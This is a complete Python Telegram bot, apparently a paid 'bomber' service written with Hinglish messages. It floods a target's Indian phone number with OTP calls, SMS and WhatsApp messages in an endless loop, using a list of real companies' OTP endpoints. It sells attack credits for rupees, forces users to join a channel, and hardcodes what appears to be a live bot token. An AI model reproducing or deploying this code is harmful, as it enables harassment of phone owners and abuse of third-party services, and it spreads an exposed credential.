#!/usr/bin/env python3

import asyncio
import aiohttp
from aiohttp import web  # Dummy Server ke liye import kiya hai
import random
import time
import json
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
import logging

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8927679179:AAHSovin2ewne_VUKY7FVEA4lEz6figrVZ0"
DEVELOPER_ID = "@theplayerror"  # Developer Telegram Username
ADMIN_IDS = [5057489358]       # Yahan apna Admin Telegram Numeric ID dalein
DB_FILE = "users_db.json"

# --- [ FORCE JOIN CONFIGURATION (SINGLE CHANNEL) ] ---
# Yahan apne Telegram Channel ka Username (@ ke sath) dalein
CHANNEL_ID = "@zerotracelegit"  # Apna Channel Username yahan dalein

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())

# --- [ FSM STATES FOR ADMIN ] ---
class AdminStates(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_add_credits = State()
    waiting_for_remove_credits = State()
    waiting_for_user_info = State()

# Attack tracking variables
stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ DATABASE FUNCTIONS ] ---
def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, 'w') as f:
            json.dump({"users": {}}, f, indent=4)
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Database read error: {e}")
        return {"users": {}}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Database save error: {e}")

def register_user(user_id, username):
    db = load_db()
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "username": f"@{username}" if username else "No Username",
            "credits": 10,  # 10 Free Credits naye user ke liye
            "total_attacks": 0,
            "joined_at": time.strftime('%d-%m-%Y %H:%M:%S')
        }
        save_db(db)
    elif username:
        db["users"][uid]["username"] = f"@{username}"
        save_db(db)

def get_user_data(user_id):
    db = load_db()
    return db["users"].get(str(user_id))

# --- [ SUBSCRIPTION VERIFICATION (FORCE JOIN) ] ---
async def check_subscription(user_id: int) -> bool:
    """Checks if user has joined the channel"""
    # Admins are exempted from verification
    if user_id in ADMIN_IDS:
        return True
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        valid_statuses = ["creator", "administrator", "member"]
        return member.status in valid_statuses
    except Exception as e:
        logger.error(f"Subscription check failed: {e}. Ensure bot is Admin in the channel.")
        return False

# --- [ DUMMY SERVER FOR RENDER ] ---
async def handle_ping(request):
    return web.Response(text="Bot is alive and running!", content_type="text/plain")

async def start_dummy_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Dummy Web Server started on port: {port}")

# --- [ ANIMATION FRAMES ] ---
ANIMATION_FRAMES = [
    "🔄 APIs Load ho rahi hain...",
    "⚡ Server connect ho raha hai...", 
    "🔥 Target par firing start...",
    "💥 Bombarding shuru ho gayi...",
    "🚀 Request bheji ja rahi hain...",
    "🎯 Target locked!"
]

# --- [ ULTIMATE API COLLECTION ] ---
ULTIMATE_APIS = [
    # Call APIs
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # SMS APIs
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Snitch SMS",
        "type": "SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    # WhatsApp APIs
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    }
]

async def hit_api(session, api, phone, stats):
    try:
        url = api["url"]
        data = api["data"](phone) if api["data"] else None
        
        if callable(url):
            url = url(phone)
        
        async with session.request(
            method=api["method"],
            url=url,
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False
        ) as response:
            if response.status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception:
        pass
    return False

async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    if frames is None:
        frames = ANIMATION_FRAMES
    
    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame}\n<code>{text_prefix}</code>"
            )
            await asyncio.sleep(0.4)
        except Exception:
            break

# --- [ KEYBOARDS ] ---
def create_main_keyboard(user_id):
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
    builder.row(types.KeyboardButton(text="👤 Meri Profile"), types.KeyboardButton(text="📊 Check Stats"))
    builder.row(types.KeyboardButton(text="💰 Buy Credits"), types.KeyboardButton(text="ℹ️ Help Guide"))
    
    if user_id in ADMIN_IDS:
        builder.row(types.KeyboardButton(text="👑 Admin Panel"))
        
    return builder.as_markup(resize_keyboard=True)

def create_stop_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
    builder.row(types.KeyboardButton(text="📊 Live Attack Stats"))
    builder.row(types.KeyboardButton(text="🏠 Main Menu"))
    return builder.as_markup(resize_keyboard=True)

def create_admin_inline_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="👥 Total Users", callback_data="adm_users"),
        InlineKeyboardButton(text="📢 Broadcast Msg", callback_data="adm_broadcast")
    )
    builder.row(
        InlineKeyboardButton(text="➕ Add Credits", callback_data="adm_give_credits"),
        InlineKeyboardButton(text="➖ Remove Credits", callback_data="adm_remove_credits")
    )
    builder.row(
        InlineKeyboardButton(text="🔍 User Info Check", callback_data="adm_user_info")
    )
    return builder.as_markup()

def create_force_join_keyboard():
    builder = InlineKeyboardBuilder()
    c_link = f"https://t.me/{CHANNEL_ID.replace('@', '')}"
    
    builder.row(InlineKeyboardButton(text="📢 Join Channel", url=c_link))
    builder.row(InlineKeyboardButton(text="✅ Verify / Joined", callback_data="verify_sub"))
    return builder.as_markup()

# --- [ FORCE JOIN HELPER MESSAGE ] ---
async def send_join_request_message(message: types.Message):
    join_text = f"""
🔒 <b>ACCESS LOCKED!</b> 🔒

Bot ke advance features use karne ke liye aapko humare official channel ko join karna zaroori hai.

🔥 <b>BOT KEY FEATURES:</b>
⚡ <b>3-in-1 Attack:</b> SMS + Voice Call + WhatsApp ek sath.
📊 <b>Live Auto-Stats:</b> Screen automatic update hogi (Live hits & timer).
🎁 <b>Free Trial:</b> Har naye user ko 10 Free Credits.
🛑 <b>Instant Stop:</b> 1-click me attack turant band karne ka control.

👇 Neeche channel join karke <b>'✅ Verify / Joined'</b> par click karein:
    """
    await message.answer(join_text, reply_markup=create_force_join_keyboard(), parse_mode="HTML")

# --- [ USER MESSAGE HANDLERS ] ---

@dp.message(CommandStart())
async def start_command(message: types.Message):
    register_user(message.from_user.id, message.from_user.username)
    
    # Check force join subscription
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    u_data = get_user_data(message.from_user.id)
    welcome_text = f"""
🎯 <b>BOMBER BOT ME AAPKA SWAGAT HAI!</b> 🎯

Aapka account successfully load ho gaya hai.

👤 <b>Aapka Balance:</b> <code>{u_data['credits']} Credits</code>
⚡ <b>Attack Cost:</b> 5 Credits per Attack

📌 <b>Kaise Use Karein:</b>
• Direct 10-digit number type karke bhejein.
• Ya fir neeche diye gaye menu buttons use karein.

👨‍💻 <b>Developer Support:</b> {DEVELOPER_ID}
    """
    await message.answer(welcome_text, reply_markup=create_main_keyboard(message.from_user.id))

@dp.callback_query(F.data == "verify_sub")
async def verify_subscription_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if await check_subscription(user_id):
        register_user(user_id, callback.from_user.username)
        await callback.answer("✅ Verification Successful! Sabhi features unlock ho gaye.", show_alert=True)
        try:
            await callback.message.delete()
        except Exception:
            pass
        
        u_data = get_user_data(user_id)
        welcome_text = f"""
🎉 <b>CONGRATULATIONS! Bot Unlocked</b> 🎉

Aapka account successfully verify ho gaya hai.

👤 <b>Balance:</b> <code>{u_data['credits']} Credits</code>
⚡ <b>Attack Cost:</b> 5 Credits per Attack

Ab aap '🚀 Start Infinite Boom' button ka use karke instant bombing start kar sakte hain!
        """
        await callback.message.answer(welcome_text, reply_markup=create_main_keyboard(user_id))
    else:
        await callback.answer("❌ Aapne channel join nahi kiya hai! Kripya channel join karein.", show_alert=True)

@dp.message(F.text == "👤 Meri Profile")
async def user_profile(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    register_user(message.from_user.id, message.from_user.username)
    u_data = get_user_data(message.from_user.id)
    
    profile_text = f"""
👤 <b>AAPKI PROFILE DETAILS</b>

🆔 <b>User ID:</b> <code>{message.from_user.id}</code>
👤 <b>Username:</b> {u_data['username']}
💰 <b>Available Credits:</b> <code>{u_data['credits']}</code>
🚀 <b>Total Attacks Done:</b> {u_data['total_attacks']}
📅 <b>Account Created:</b> {u_data['joined_at']}

ℹ️ <i>Ek attack start karne par 5 credits deduct hote hain.</i>
    """
    await message.answer(profile_text, parse_mode="HTML")

@dp.message(F.text == "💰 Buy Credits")
async def buy_credits_info(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    plans_text = f"""
💎 <b>OFFICIAL RECHARGE PLANS</b> 💎

Agar aapke credits khatam ho gaye hain to recharge karein:

💵 <b>Plan ₹30:</b> 50 Credits (10 Attacks)
💵 <b>Plan ₹50:</b> 90 Credits (18 Attacks)
💵 <b>Plan ₹70:</b> 130 Credits (26 Attacks)

<b>Custom Credit Rate:</b>
👉 <b>₹2.5 = 4 Credits</b> (Minimum recharge ₹10)

📥 <b>Recharge Kaise Karein?</b>
1. Admin ko contact karein: {DEVELOPER_ID}
2. Apna <b>User ID</b> bhejein: <code>{message.from_user.id}</code>
3. Payment screenshot bhejne par credits turant add ho jayenge!
    """
    await message.answer(plans_text, parse_mode="HTML")

@dp.message(F.text == "ℹ️ Help Guide")
async def help_command(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    help_text = f"""
🆘 <b>HELP & USAGE GUIDE</b> 🆘

1. <b>'🚀 Start Infinite Boom'</b> par click karein.
2. Target ka 10-digit mobile number bina <code>+91</code> ke bhejein.
3. Attack shuru hote hi aapke account se <b>5 credits</b> cut ho jayenge.
4. Bombing rokne ke liye <b>'🛑 STOP ATTACK'</b> dabayein.

Kisi bhi problem ya recharge ke liye contact: {DEVELOPER_ID}
    """
    await message.answer(help_text, parse_mode="HTML")

# --- [ ADMIN PANEL & FSM HANDLERS ] ---

@dp.message(F.text == "👑 Admin Panel")
async def admin_panel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    await message.answer(
        "🛠️ <b>ADMIN CONFIGURATION PANEL</b>\n\nNeeche diye gaye buttons se bot manage karein:",
        reply_markup=create_admin_inline_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "adm_users")
async def admin_total_users(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    db = load_db()
    total_users = len(db["users"])
    
    users_list = "👥 <b>Recent Users List:</b>\n"
    for uid, data in list(db["users"].items())[-10:]:
        users_list += f"• <code>{uid}</code> | {data['username']} | Cr: <b>{data['credits']}</b>\n"
        
    await callback.message.edit_text(
        f"📊 <b>Total Registered Users:</b> {total_users}\n\n{users_list}",
        reply_markup=create_admin_inline_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "adm_broadcast")
async def admin_broadcast_prompt(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_broadcast)
    await callback.message.answer("📢 Sabhi users ko broadcast karne wala message bhejiye:")
    await callback.answer()

@dp.message(AdminStates.waiting_for_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    if message.from_user.id not in ADMIN_IDS:
        return
    
    db = load_db()
    all_users = list(db["users"].keys())
    success = 0
    failed = 0
    
    status_msg = await message.answer("⏳ <i>Broadcast bheja ja raha hai... Kripya wait karein.</i>")
    
    for uid in all_users:
        try:
            await bot.send_message(chat_id=int(uid), text=message.text, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
            
    await status_msg.edit_text(
        f"📢 <b>BROADCAST REPORT:</b>\n\n"
        f"✅ Successfully Sent: {success}\n"
        f"❌ Failed/Blocked: {failed}"
    )

@dp.callback_query(F.data == "adm_give_credits")
async def admin_add_credits_prompt(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_add_credits)
    await callback.message.answer(
        "➕ <b>ADD CREDITS</b>\n\n"
        "Format me details bhejein:\n"
        "<code>[User_ID] [Credits_Amount]</code>\n\n"
        "Example: <code>5057489358 100</code>"
    )
    await callback.answer()

@dp.message(AdminStates.waiting_for_add_credits)
async def process_add_credits(message: types.Message, state: FSMContext):
    await state.clear()
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        user_id, amount = message.text.split()
        amount = int(amount)
        
        db = load_db()
        if user_id in db["users"]:
            db["users"][user_id]["credits"] += amount
            save_db(db)
            await message.answer(f"✅ User <code>{user_id}</code> ke account me <b>{amount} Credits</b> add ho gaye.")
            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text=f"🎁 <b>Recharge Successful!</b>\nAdmin ne aapke account me <code>{amount} Credits</code> add kiye hain!"
                )
            except Exception:
                pass
        else:
            await message.answer("❌ User Database me nahi mila!")
    except Exception:
        await message.answer("❌ Invalid Format! Format check karke dubara try karein.")

@dp.callback_query(F.data == "adm_remove_credits")
async def admin_remove_credits_prompt(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_remove_credits)
    await callback.message.answer(
        "➖ <b>REMOVE CREDITS</b>\n\n"
        "Format:\n"
        "<code>[User_ID] [Amount]</code>\n\n"
        "Example: <code>5057489358 50</code>"
    )
    await callback.answer()

@dp.message(AdminStates.waiting_for_remove_credits)
async def process_remove_credits(message: types.Message, state: FSMContext):
    await state.clear()
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        user_id, amount = message.text.split()
        amount = int(amount)
        
        db = load_db()
        if user_id in db["users"]:
            db["users"][user_id]["credits"] = max(0, db["users"][user_id]["credits"] - amount)
            save_db(db)
            await message.answer(f"✅ User <code>{user_id}</code> se <b>{amount} Credits</b> cut kar diye gaye.")
        else:
            await message.answer("❌ User Database me nahi mila!")
    except Exception:
        await message.answer("❌ Invalid format entered!")

@dp.callback_query(F.data == "adm_user_info")
async def admin_user_info_prompt(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_user_info)
    await callback.message.answer("🔍 User details check karne ke liye <b>User ID</b> bhejein:")
    await callback.answer()

@dp.message(AdminStates.waiting_for_user_info)
async def process_user_info(message: types.Message, state: FSMContext):
    await state.clear()
    if message.from_user.id not in ADMIN_IDS:
        return
    
    uid = message.text.strip()
    db = load_db()
    if uid in db["users"]:
        u_data = db["users"][uid]
        info_text = f"""
👤 <b>USER DETAILS SUMMARY:</b>

🆔 <b>User ID:</b> <code>{uid}</code>
👤 <b>Username:</b> {u_data['username']}
💰 <b>Current Credits:</b> <code>{u_data['credits']}</code>
🚀 <b>Total Attacks Done:</b> {u_data['total_attacks']}
📅 <b>Joining Date:</b> {u_data['joined_at']}
        """
        await message.answer(info_text)
    else:
        await message.answer("❌ Yeh user ID bot me registered nahi hai.")

# --- [ ATTACK LOGIC & EXECUTION ] ---

@dp.message(F.text == "🚀 Start Infinite Boom")
async def start_attack_prompt(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    register_user(message.from_user.id, message.from_user.username)
    u_data = get_user_data(message.from_user.id)
    
    if u_data["credits"] < 5:
        await message.answer(
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"Aapke pass sirf <code>{u_data['credits']} Credits</code> bache hain.\n"
            f"Ek attack start karne ke liye minimum <b>5 Credits</b> chahiye.\n\n"
            f"Recharge karne ke liye '💰 Buy Credits' option choose karein.",
            reply_markup=create_main_keyboard(message.from_user.id)
        )
        return
        
    await message.answer(
        "📱 <b>Target ka 10-digit mobile number enter karein:</b>\n\n"
        "Example: <code>9876543210</code>\n\n"
        "⚠️ Bina country code (+91) ke number bhejein.",
        parse_mode="HTML"
    )

@dp.message(F.text.regexp(r'^\d{10}$'))
async def handle_phone_number(message: types.Message):
    user_id = message.from_user.id
    phone = message.text
    
    if not await check_subscription(user_id):
        await send_join_request_message(message)
        return
        
    register_user(user_id, message.from_user.username)
    db = load_db()
    u_data = db["users"].get(str(user_id))
    
    # Balance Check
    if u_data["credits"] < 5:
        await message.answer(
            f"❌ <b>Low Balance!</b>\n"
            f"Aapke pass {u_data['credits']} credits hain (Chahiye: 5 Credits).\n\n"
            f"Recharge ke liye '💰 Buy Credits' check karein.",
            reply_markup=create_main_keyboard(user_id)
        )
        return
    
    # Phone number validation
    if not phone.startswith(('6', '7', '8', '9')):
        await message.answer(
            "❌ <b>Galat Number!</b>\n"
            "Indian phone number 6, 7, 8 ya 9 se shuru hona chahiye.",
            parse_mode="HTML"
        )
        return
    
    # Deduct 5 Credits
    db["users"][str(user_id)]["credits"] -= 5
    db["users"][str(user_id)]["total_attacks"] += 1
    save_db(db)
    
    # State reset
    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': phone,
        'start_time': time.time(),
        'delay': 5,
        'cycles': 0
    }
    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }
    
    start_msg = await message.answer(
        "🎯 <b>ATTACK INITIALIZING...</b>\n\n"
        f"🎯 <b>Target:</b> <code>{phone}</code>\n"
        f"⚡ <b>5 Credits Deducted</b> (Left: {db['users'][str(user_id)]['credits']})\n\n"
        "🚀 Server se connection banaya ja raha hai...",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )
    
    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
    
    # Start Attack Task
    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))

async def run_attack(user_id, phone, chat_id, message_id):
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                attack_info['cycles'] = cycle_count
                stats['cycles'] = cycle_count
                
                # Execute Parallel API Hits
                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp
                
                stats['last_update'] = time.strftime('%H:%M:%S')
                
                status_text = f"""
🎯 <b>ATTACK RUNNING - CYCLE {cycle_count}</b>

📱 <b>Target:</b> <code>{phone}</code>
⚡ <b>Status:</b> High Speed Firing Active

📊 <b>LIVE HITS COUNT:</b>
📞 <b>Calls:</b> {calls}
📩 <b>SMS:</b> {sms}
💬 <b>WhatsApp:</b> {whatsapp}
🔥 <b>Total Hits:</b> {total}

⏳ <b>Next Cycle:</b> {delay}s me
🕒 <b>Last Hit:</b> {stats['last_update']}
                """
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_text,
                        parse_mode="HTML",
                        reply_markup=create_stop_keyboard()
                    )
                except Exception:
                    pass
                
                if stop_signals.get(user_id, False):
                    break
                    
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Cycle execution error: {e}")
                await asyncio.sleep(5)
    
    # Attack Finished
    final_stats = attack_stats.get(user_id, {})
    calls = final_stats.get('Call', 0)
    sms = final_stats.get('SMS', 0)
    whatsapp = final_stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    final_text = f"""
🛑 <b>ATTACK STOP KAR DIYA GAYA HAI</b>

📱 <b>Target:</b> <code>{phone}</code>
🔄 <b>Total Cycles:</b> {cycle_count}
⏱️ <b>Time Duration:</b> {time.time() - attack_info['start_time']:.1f}s

📊 <b>FINAL SUMMARY:</b>
📞 Calls Made: {calls}
📩 SMS Delivered: {sms}
💬 WhatsApp Sent: {whatsapp}
🔥 <b>Total Hits: {total}</b>

✅ <i>Status: Attack Terminated</i>
    """
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode="HTML",
            reply_markup=create_main_keyboard(user_id)
        )
    except Exception:
        pass
    
    if user_id in stop_signals: del stop_signals[user_id]
    if user_id in user_attacks: del user_attacks[user_id]

# --- [ REAL-TIME LIVE STATS STREAM HANDLER ] ---
async def stream_live_stats(chat_id, message_id, user_id):
    """Automatic background live status updater with dynamic seconds count"""
    last_text = ""
    
    while user_id in user_attacks and not stop_signals.get(user_id, False):
        try:
            stats = attack_stats.get(user_id, {})
            attack_info = user_attacks.get(user_id, {})
            
            calls = stats.get('Call', 0)
            sms = stats.get('SMS', 0)
            wa = stats.get('WhatsApp', 0)
            total = calls + sms + wa
            cycles = stats.get('cycles', 0)
            
            start_time = attack_info.get('start_time', time.time())
            elapsed = int(time.time() - start_time)
            phone = attack_info.get('phone', 'N/A')
            
            live_text = f"""
🔴 <b>LIVE REAL-TIME ATTACK MONITOR</b>

📱 <b>Target:</b> <code>{phone}</code>
⏱️ <b>Running Time:</b> <code>{elapsed} seconds</code>
🔄 <b>Cycles Completed:</b> <code>{cycles}</code>

📊 <b>LIVE HIT COUNTERS:</b>
📞 <b>Calls Sent:</b> {calls}
📩 <b>SMS Sent:</b> {sms}
💬 <b>WhatsApp Sent:</b> {wa}
━━━━━━━━━━━━━━━━
🔥 <b>Total Hits Delivered:</b> <b>{total}</b>

⚡ <i>Status: Auto-updating live every 2.5s...</i>
            """
            
            if live_text != last_text:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=live_text,
                    parse_mode="HTML"
                )
                last_text = live_text
                
            await asyncio.sleep(2.5)  # Telegram API limit safe delay
            
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except TelegramBadRequest:
            await asyncio.sleep(2.5)
        except Exception as e:
            logger.error(f"Live stats stream error: {e}")
            await asyncio.sleep(3)
            
    # Attack Khatam hone par Final Display
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="⏹️ <b>Live Monitor Ended:</b> Attack stop ho chuka hai ya complete ho gaya hai.",
            parse_mode="HTML"
        )
    except Exception:
        pass

# --- [ NAVIGATION & CONTROLS ] ---

@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    user_id = message.from_user.id
    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer(
            "🛑 <b>Attack Stop ho raha hai...</b>\nCurrent cycle complete hote hi band ho jayega.",
            reply_markup=create_main_keyboard(user_id)
        )
    else:
        await message.answer("ℹ️ Koi bhi active attack running nahi hai.", reply_markup=create_main_keyboard(user_id))

@dp.message(F.text == "📊 Live Attack Stats")
async def live_stats(message: types.Message):
    user_id = message.from_user.id
    if not await check_subscription(user_id):
        await send_join_request_message(message)
        return
        
    if user_id in attack_stats and user_id in user_attacks:
        live_msg = await message.answer(
            "📡 <b>Live Monitor Se Connect Ho Raha Hai...</b>\n<i>Kripya wait karein, live data load ho raha hai...</i>",
            parse_mode="HTML"
        )
        asyncio.create_task(stream_live_stats(message.chat.id, live_msg.message_id, user_id))
    else:
        await message.answer("ℹ️ Koi running attack data nahi mila.")

@dp.message(F.text == "📊 Check Stats")
async def check_stats(message: types.Message):
    user_id = message.from_user.id
    if not await check_subscription(user_id):
        await send_join_request_message(message)
        return
        
    register_user(user_id, message.from_user.username)
    u_data = get_user_data(user_id)
    await message.answer(
        f"📊 <b>ATTACK HISTORY & BALANCE</b>\n\n"
        f"👤 Account: {u_data['username']}\n"
        f"🚀 Total Attacks Launched: <code>{u_data['total_attacks']}</code>\n"
        f"💰 Remaining Credits: <code>{u_data['credits']}</code>"
    )

@dp.message(F.text == "🏠 Main Menu")
async def main_menu(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    await message.answer(
        "🏠 <b>Main Menu</b>\nNeeche diye gaye option select karein:",
        reply_markup=create_main_keyboard(message.from_user.id)
    )

@dp.message()
async def handle_other_messages(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    await message.answer(
        "❓ <b>Invalid Input!</b>\n\nKripya buttons ka use karein ya 10-digit number bhejein.",
        reply_markup=create_main_keyboard(message.from_user.id),
        parse_mode="HTML"
    )

# --- [ BOT BOOTSTRAP ] ---
async def main():
    logger.info("Bot start ho raha hai...")
    logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
    
    try:
        await start_dummy_server()
    except Exception as e:
        logger.error(f"Dummy Server start karne me dikkat aayi: {e}")
        
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Bot crash error: {e}")
        await asyncio.sleep(5)
        await main()

if __name__ == "__main__":
    asyncio.run(main())
